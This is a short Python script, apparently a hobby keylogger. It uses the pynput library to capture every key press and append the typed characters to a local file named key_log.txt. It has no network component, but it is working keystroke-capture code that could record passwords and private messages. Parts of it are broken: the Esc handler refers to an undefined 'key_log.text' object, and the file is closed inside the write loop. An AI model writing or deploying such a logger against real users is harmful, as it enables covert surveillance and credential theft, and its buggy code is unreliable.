from pynput.keyboard import Key, Listener

count = 0
keys = []

def key_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    write_file(keys)
    keys = []

def write_file(keys):
    with open("key_log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'"," ")
            if k.find("space") > 0:
                f.write(str('\n'))
                f.close()
            elif k.find("key") == -1:
                f.write(k)
                f.close()


def key_release(key):
    if key == Key.esc:
        key_log.text.close()
        return False

def main():
    with Listener(on_press=key_press, on_release=key_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()      
